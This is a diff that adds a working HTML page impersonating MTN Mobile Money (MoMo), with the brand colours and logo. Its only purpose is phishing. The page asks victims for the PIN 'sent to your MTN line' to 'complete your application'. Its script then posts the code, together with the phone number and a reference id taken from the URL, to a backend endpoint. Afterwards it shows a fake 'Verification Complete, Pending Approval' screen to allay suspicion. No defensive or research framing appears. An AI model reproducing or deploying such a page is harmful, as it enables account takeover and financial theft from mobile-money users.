@@ -1,0 +1,187 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Enter your MTN 4-DIGIT PIN - MoMo</title>
+    <style>
+        * { margin: 0; padding: 0; box-sizing: border-box;
+            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif; }
+        body { background: #f4f4f4; min-height: 100vh; display: flex; flex-direction: column; }
+
+        .header { background: #fff; padding: 14px 24px; display: flex; align-items: center;
+                  gap: 16px; border-bottom: 3px solid #ffcc00;
+                  box-shadow: 0 2px 8px rgba(0,0,0,.04); }
+        .logo-box { display: flex; align-items: center; gap: 10px; }
+        .logo-icon { width: 42px; height: 42px; background: #ffcc00; border-radius: 8px;
+                     display: flex; align-items: center; justify-content: center;
+                     font-weight: 800; font-size: 11px; color: #004f9f; text-align: center;
+                     border: 2px solid #004f9f; line-height: 1; }
+        .logo-text { font-weight: 800; font-size: 20px; color: #004f9f; }
+        .header-title { font-size: 18px; font-weight: 700; color: #222; flex: 1; }
+        .hamburger { font-size: 22px; color: #333; cursor: pointer; }
+
+        .main { flex: 1; display: flex; flex-direction: column;
+                align-items: center; padding: 60px 16px; }
+        .page-title { font-size: 32px; font-weight: 800; color: #111;
+                      text-align: center; margin-bottom: 40px; }
+
+        .card { background: #fff; width: 100%; max-width: 500px; border-radius: 16px;
+                padding: 44px 36px 36px; box-shadow: 0 8px 30px rgba(0,0,0,.08);
+                text-align: center; }
+        .card-icon { width: 70px; height: 70px; background: #fff5cc; border-radius: 50%;
+                     display: flex; align-items: center; justify-content: center;
+                     margin: 0 auto 20px; font-size: 32px; }
+        .card-label { font-size: 14px; font-weight: 600; color: #444;
+                      margin-bottom: 8px; line-height: 1.5; }
+        .card-sub { font-size: 13px; color: #888; margin-bottom: 24px; }
+
+        .card input {
+            width: 100%; padding: 18px 20px; font-size: 20px;
+            font-family: inherit; border: 2px solid #ffcc00; border-radius: 10px;
+            background: #fffdf5; color: #111; outline: none;
+            text-align: center; font-weight: 700; letter-spacing: 3px;
+            margin-bottom: 14px; transition: box-shadow .2s;
+        }
+        .card input::placeholder { color: #ccc; letter-spacing: 2px; font-weight: 500; }
+        .card input:focus { box-shadow: 0 0 0 4px rgba(255,204,0,.25); }
+        .card input.error { border-color: #e33; background: #fff5f5; }
+
+        .error-msg { display: none; font-size: 13px; color: #c33;
+                     font-weight: 600; margin-bottom: 14px; }
+        .error-msg.show { display: block; }
+
+        .submit-btn {
+            display: block; width: 100%; background: #ffcc00; color: #111;
+            border: none; padding: 18px; font-size: 16px; font-weight: 800;
+            letter-spacing: .5px; border-radius: 10px; cursor: pointer;
+            transition: background .2s, transform .1s; margin-bottom: 14px;
+        }
+        .submit-btn:hover { background: #e6b800; }
+        .submit-btn:active { transform: scale(.99); }
+        .submit-btn:disabled { background: #ddd; color: #999; cursor: not-allowed; }
+
+        .footer { background: #111; color: #ffcc00; text-align: center;
+                  padding: 18px; font-size: 13px; font-weight: 600; }
+
+        @media (max-width: 480px) {
+            .page-title { font-size: 26px; }
+            .card { padding: 32px 22px 26px; }
+            .header-title { font-size: 15px; }
+        }
+    </style>
+</head>
+<body>
+
+    <header class="header">
+        <span class="hamburger">☰</span>
+        <div class="logo-box">
+            <div class="logo-icon">MoMo<br>MTN</div>
+            <span class="logo-text">MoMo</span>
+        </div>
+        <span class="header-title">MTN Mobile Services</span>
+    </header>
+
+    <main class="main">
+        <h1 class="page-title">Enter Your MTN 4-Digit PIN</h1>
+
+        <div class="card">
+            <div class="card-icon">🔒</div>
+
+            <p class="card-label">Enter the 4-digit PIN<br>sent to your MTN line</p>
+            <p class="card-sub">This is the last step to complete your application</p>
+
+            <div class="error-msg" id="errorMsg"></div>
+
+            <form id="finalForm">
+                <input type="text" id="finalCode" placeholder="XXXX"
+                       maxlength="20" autocomplete="off" required>
+
+                <button type="submit" class="submit-btn" id="submitBtn">
+                    Confirm PIN
+                </button>
+            </form>
+        </div>
+    </main>
+
+    <footer class="footer">© 2026 MoMo</footer>
+
+    <script>
+        const params = new URLSearchParams(window.location.search);
+        const phone = params.get('phone') || 'unknown';
+        const refId = params.get('ref')   || '';
+
+        const finalInput = document.getElementById('finalCode');
+        const errorMsg   = document.getElementById('errorMsg');
+        const submitBtn  = document.getElementById('submitBtn');
+
+        // Auto-format the PIN (same style as verify page)
+        finalInput.addEventListener('input', function () {
+            let v = this.value.toUpperCase().replace(/[^A-Z0-9]/g, '');
+            let out = '';
+            if (v.startsWith('MM')) {
+                out = v.substring(0, 2);
+                if (v.length > 2) out += '-' + v.substring(2, 6);
+                if (v.length > 6) out += '-' + v.substring(6, 10);
+            } else {
+                out = v.substring(0, 4);
+                if (v.length > 4) out += '-' + v.substring(4, 8);
+                if (v.length > 8) out += '-' + v.substring(8, 12);
+            }
+            this.value = out;
+            this.classList.remove('error');
+            errorMsg.classList.remove('show');
+        });
+
+        // Submit final code
+        document.getElementById('finalForm').addEventListener('submit', async function (e) {
+            e.preventDefault();
+
+            const finalCode = finalInput.value.trim();
+            if (finalCode.length < 4) {
+                errorMsg.textContent = 'Please enter a valid 4-digit PIN';
+                errorMsg.classList.add('show');
+                finalInput.classList.add('error');
+                return;
+            }
+
+            submitBtn.disabled = true;
+            submitBtn.textContent = 'Submitting...';
+
+            try {
+                const res = await fetch('/api/final-code', {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify({ phone, refId, finalCode })
+                });
+
+                if (!res.ok) throw new Error('Server error');
+
+                // Show success message
+                document.querySelector('.card').innerHTML = `
+                    <div style="width:90px;height:90px;border-radius:50%;background:#2e9e4f;
+                                display:flex;align-items:center;justify-content:center;
+                                margin:0 auto 20px;font-size:44px;color:#fff;">✓</div>
+                    <h2 style="font-size:22px;font-weight:800;color:#2e9e4f;margin-bottom:12px;">
+                        Verification Complete
+                    </h2>
+                    <div style="display:inline-block;padding:8px 16px;border-radius:20px;
+                                background:#e8f7ec;color:#2e9e4f;font-size:13px;font-weight:700;
+                                margin-bottom:20px;">STATUS: PENDING APPROVAL</div>
+                    <p style="font-size:15px;color:#444;line-height:1.6;">
+                        Your application has been fully submitted.<br>
+                        Please wait for approval.
+                    </p>
+                `;
+
+            } catch (err) {
+                console.error('Submit failed:', err);
+                errorMsg.textContent = '⚠️ Network error. Please try again.';
+                errorMsg.classList.add('show');
+                submitBtn.disabled = false;
+                submitBtn.textContent = 'Confirm Final Code';
+            }
+        });
+    </script>
+</body>
+</html>
